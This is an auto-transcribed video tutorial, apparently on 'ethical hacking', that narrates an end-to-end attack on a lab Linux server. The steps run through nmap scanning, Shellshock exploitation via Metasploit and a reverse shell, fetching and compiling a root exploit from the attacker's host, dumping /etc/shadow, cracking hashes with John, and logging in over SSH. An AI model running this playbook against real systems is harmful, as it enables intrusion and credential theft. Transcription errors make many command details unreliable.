@@ -1,0 +1,439 @@
+and yesterday we'll be learning
+end-to-end article hacking by going
+after a specific system and we're
+learning step by step what we can do
+exactly to scan a device and then after
+which to be able to gain complete
+control of the entire computer system
+and remember kids hacking is illegal if
+you want to run any of these radical
+hacking techniques do not try it on mr
+hackaloy
+[Music]
+number one we'll be learning about what
+we can do in terms of scanning devices
+all right so when we scan a device we're
+trying to look out for vulnerabilities
+and it could be a server it could be a
+phone it could be any of these devices
+that you're trying to go after number
+two what we're trying to do here is to
+find a vulnerability inside the system
+that we can take advantage of so once we
+find a loophole all right we will be
+able to gain complete control of the
+device and once we're in the question
+mark is going to be what else can we do
+all right so once you're in what is it
+can we can do in terms of post
+exploitation all right what can we do to
+elevate our privileges to be able to
+gain complete control of the system to
+even break the password of the computer
+so as you can see right here on the left
+side we have the hacker computer all
+right so this is hacker and what the
+hacker want to do is then to be able to
+first scan and then loose down all of
+those services for example do they have
+a file transfer protocol server do they
+have a secure shell being opened up do
+they have a website running so that we
+can take advantage of those weaknesses
+within it and so on and so forth and
+once we're able to list down all of this
+we can get the version and then from
+there we can determine all right what
+are the different attack methods that we
+can go after so right here this is the
+place where we'll be thinking and
+deciding about what are the different
+types of attack methods that we can use
+then after which we can launch a target
+against say the website okay launch an
+attack against into the ftp server into
+secure shell whichever the case is once
+we have uncovered exploit to use and
+once we're in right here into the system
+right what we want to do then is to
+elevate our privileges so that from a
+normal user we now have the ability to
+get root access meaning that we can
+literally do anything we want with the
+device remember smash the like button
+and turn on notifications so that you
+don't get hacked so right in front of us
+we're in call linux and the first thing
+you want to do is go ahead and open up
+terminal and once you're on terminal
+what you want to do right here is to
+have the ability to begin scanning the
+device or the server or the system
+however you want to call it so the first
+thing you want to do is enter nmap so
+nmap is going to be the tool that we'll
+use to help us scan the target device so
+here when you enter nmap you can see all
+the options are available for us to scan
+the device to look out for all the
+services so literally like knocking door
+on the house trying to scan a house
+looking out for openings that we can
+then of course be able to jump into the
+house and take out for example the cash
+and the valuables and the jewelries
+right so this is exactly what we'll be
+doing as part of launching the attack so
+the first thing you want to do is to
+scan the ip address all the hostname all
+the domain name the goal is that now you
+have a target in mind so you can enter
+for example the following which is nmap
+and what we want to do now is to enter
+say 1i2
+168.00114 so this is going to be target
+device that we're going after so in this
+case i can enter dash as follow by v so
+this is for the service version that
+we're going after dash capital o for the
+operating system version so we want to
+know whether it is a linux what version
+of linux is it if it is a windows
+computer what version of windows
+computer is it running on and then after
+which we want to target the ports so
+ports are the services that can be made
+available from the target device so in
+this case we can target say from port
+one all the way to six five five three
+five so once you're done with that hit
+enter and of course we asked to enter
+superuser do all right because it
+requires root privileges so enter on
+that enter your password hit enter and
+now we're scanning the device to look up
+for all these different services that
+are running on the server and now the
+scan is completed so right here you can
+see the following all right we have all
+this different port numbers all right
+followed by the protocol so in this case
+there could be protocols like
+transmission control protocol and the
+state is of course open and you can see
+at the same time what kind of service is
+it running on is it a file transfer
+protocol secure shell all right http ipp
+and all of that all right so all of
+their services as well as the version on
+the most right side so this is a really
+wonderful way to quickly identify all
+right all of these different services
+all of the different versions and once
+you have the version you can then
+determine what kind of export you want
+to use to go after all these different
+type of services so that you can have
+access into the system and for today's
+case we will be targeting on apigee and
+so you can see right here we have http
+2.4.7 so we'll be targeting the
+following so as part of targeted device
+all we got to do is just go ahead and
+enter the domain name of the ip address
+here and you can see right here this is
+the directory listing so you can see all
+of the directories the files within it
+so you can always click around to do
+your enumeration and find out right what
+is going on so this is a really quick
+way for you to look out for all these
+different ways and all these different
+services that can be helped fd for
+example in this case the apogee the web
+server level and what we can do next is
+jump over to use a tool called dirb so
+this is a way for us to be able to look
+out for all the different directories
+that is held by the server so that we
+can possibly look out for some of these
+openings which can give us an access
+into the server okay so here you can see
+the following all right all these are
+different options available and you can
+just simply enter the following all
+right so here we go all these examples
+the irb followed by the protocol of
+course in this case http and of course
+you have the url and of course a
+targeted directory so all you got to do
+now is enter dirb okay let me go ahead
+and clear this
+enter d-i-r-b for my http
+182.168.0.114. and once you're done with
+that go ahead and hit enter and you can
+see right here okay we're scanning and
+we're looking out for some really
+interesting thing and as you can see
+we're done so all we're going to do is
+scroll all the way back to the top and
+look up for any interesting results and
+one of those interesting results that we
+want to target is the one right here
+okay so this is cgi bin and this is a
+place where we're going to target the
+exploits next up what we really want to
+do is to figure out what is really in
+cgi bit so all i got to do is enter dirb
+followed by slash cgi dash bin slash hit
+enter on that so we're trying to figure
+out are there any files within it so you
+can see right here we have the following
+all right we have the cgi bin and of
+course we have the hollow world dot sh
+so this is the area for us to target and
+cgi stands for common gateway interface
+and it is a way for the web server to
+interact with external content
+generating programs and so on and so
+forth so we'll be leveraging on this cgi
+or for us to be able to gain access into
+the system so what we can do now is to
+use a really handy tool called mad
+splice so you can go ahead and enter
+sudo msf console hit enter on that and
+this will start up metasploit and what
+we are looking out for here in this case
+is to look for a exploit that we can use
+as part targeting server so all you got
+to do is enter search shell shop hit
+enter on that and here we have several
+options available for us so we'll be
+using one of that over here so this is
+the one that we'll be targeting to use
+so it is going to be under exploit multi
+http apigee mod cgi bash environment
+execute so all we're going to do now is
+enter use all right followed by one and
+once you do that you can see the
+following all right so we have exploit
+multi http apigee mod cgi bash env exec
+alright so you can enter show options
+specify the option as part of targeting
+the server so all we got to do now is go
+ahead and take a look at the following
+all right so we have the header so we'll
+be using the http user agent header so
+this is all the values you want to send
+so here we have the set r host and of
+course we have the arm path and we have
+the target uri you have discovered so go
+ahead and hit enter on that and the
+reason why we need a reverse shell is
+because the hacker wants to have taken
+advantage of a vulnerability and they
+have sent the exploit as well as the
+payload what happened is that if they
+try to open up a service all right so
+when they open up a service so that they
+can then finally be able to access over
+into the system you realize that they'll
+get blocked the reason why they could
+get blocked is because there is a
+firewall right here so the firewall will
+be inspecting all this different traffic
+and of course at the same time filter
+out all these unnecessary ports that
+could be opened up or all these
+different services that could be open up
+as a result of that what the hackers
+want to do is once they have exploited
+in the system they want to force a
+reverse connection outwards the reason
+is because a lot of all these different
+firewalls they allow or complete
+outbound access all right so meaning
+that they do not restrict a lot of all
+these different outbound connectivities
+to the internet once you're ready in
+three
+two
+one hit exploit and you can see right
+here materpata session two open
+and we have the following okay
+that's it we are in it is game over it's
+as simple as that and once we're in i
+can enter says info and you can see
+the ip address the os the architecture
+and all of the data so quickly now what
+we want to do is to be able to dump out
+the username to passwords within the
+computer system so what i can do now is
+enter shell and see where we get all
+right so once we're in here i can enter
+who am i and you notice that we're on
+www dash data all right let's see
+whether we are going to be able to do a
+to cat etc shadow and this is the place
+where all this important information
+usernames and all this data are there so
+we are not able to do that i can enter
+pwd so we have preen working directory
+so we have fairly limited access into
+the system no worries i will teach you
+how we can elevate our privileges in the
+system so here we have pretty good
+example all right so here we have the
+following of 2021
+0903 and we have 37292.c
+all right so this is the one we'll be
+using as part of sending and uploading
+into the server so that we can elevate
+our privileges okay so all we're going
+to do now is enter say torch
+37 292.c okay once you're entered on
+that you can enter say mousepad 37292.c
+hit enter on that and all you got to do
+is just literally just copy and paste
+whatever you're seeing right here and go
+ahead and send it over into the file so
+save it into file and once you're done
+with that go ahead and close mousepad
+and what we can do now is jump back over
+into terminal right and what we can do
+is go back into interpreter and what we
+can do next is to upload the file so
+once we're in interpreter all we're
+going to do is enter upload all right
+followed by slash loyalian desktop slash
+37292.c
+hit enter on that and see the following
+operation fail and the reason why you
+may be getting this is because we do not
+have right permission so if i go and
+enter shell so we're in right now so i
+enter pwd if i try to do say torch
+abc all right hit enter and that cannot
+touch abc permission denied so we can
+exit from here and now what we can do is
+to think about whether we can upload
+this file into our own server and then
+after which
+from all right target or the session
+that we currently have download the file
+and be able to run some
+other directories so going back into
+another terminal all you're going to do
+is enter sudo systemctl all right fold
+by start
+apogee2.service hit enter on that
+enter your password and this would help
+us start up
+the apigee server so that we can host
+our malicious file so what you can do
+now is go ahead and enter copy
+37292 into var www.html slash hit enter
+on that so done we're able to now host
+this file over and then the target user
+can now download that file so what i can
+do now is go ahead and say cd over slash
+tam all right so this is a directory
+that's available in pretty much all of
+the linux servers so that we can write a
+temporary file in so what i can do now
+is go ahead do the following enter shell
+and to wget http 1i2
+168.0.192 followed by slash all right
+37292.c hit enter and that
+oh my are you seeing that we just
+downloaded the file meaning that we are
+now able to execute on this by doing the
+following okay so all we're going to do
+now is enter gcc37292.c
+and then we want to output this over to
+say follow ofs okay so done and next up
+we can do a chmod plus x to make this
+executable ofs done enter dot slash ofs
+hit enter on that
+guess what all right who am i
+we got root we're in we have complete
+control over the entire system so what
+we want to do now is to be able to break
+the username and passwords on the linux
+server yes i know this is pretty crazy
+stuff so what i can do now is go ahead
+and enter say cat etc shadow hit enter
+on that and we have all these different
+details and you can save them all up
+into a file alright so in this case we
+can save all of this into a shadow file
+on kala linux next up what we want to do
+is enter cad etc passwd hit enter on
+that as well and likewise we want to
+save this all right over into a file on
+kali linux so that we can do our
+password breaking so i've already saved
+up the file and you'll be able to see
+the following so i can do a cat
+shadow all right hit enter on that and
+we can see all right the exact same file
+right here and we have many interesting
+uses like anakin skywalker darth vader
+all these really interesting star wars
+characters so next up what we can do is
+likewise we can do a cam passwd all
+right so here same thing we're seeing
+all the exact same copy from the linux
+server over into a collection machine so
+what we can do next is to go ahead and
+enter on shadow all right followed by
+passwd followed by shadow and then what
+we can do now is i'll put it into
+unshadowed dot txt all right so go ahead
+and hit enter on that
+alright so done okay what we can do next
+is to use john john is going to be a
+password cracking software it will use
+as part of breaking into that file so
+what we can do now is enter john full by
+the word list equal all right so in this
+case we can enter usr
+share word lists follow my rockq.txt
+okay and then after which target the
+unshadow.txt
+and then three
+two one hit enter on that
+you can see the following okay over here
+it states loaded one password hash okay
+so all we're gonna do right now is just
+do the following by entering show so you
+can enter john
+show now we can enter unshadowed dot txt
+hit enter on that we got a following
+here okay so we got vagrant vagrant so
+here we got the username as well as the
+password field just like that remember
+earlier we had a secure shell service
+that's available so what we can do now
+is go ahead and enter ssh vargrand at
+192 168.0.114
+and hit enter on that now we can enter
+the password all right which is vanguard
+as well what the heck we are in we have
+a connection over into the linux server
+using a broken username and password in
+terms of defense it's really important
+and critical to always be testing
+scanning your different servers that you
+have because they could be hosting a lot
+of production workloads and you want to
+ensure that there's no misconfiguration
+there is no miss security patches so
+that all this different type of exploits
+cannot be easily conducted against your
+servers so once again i hope you learned
+something valuable in today's tutorial
+so like share subscribe and turn on
+notifications so that you can be kept
+abreast of the latest article hacking
+tutorials
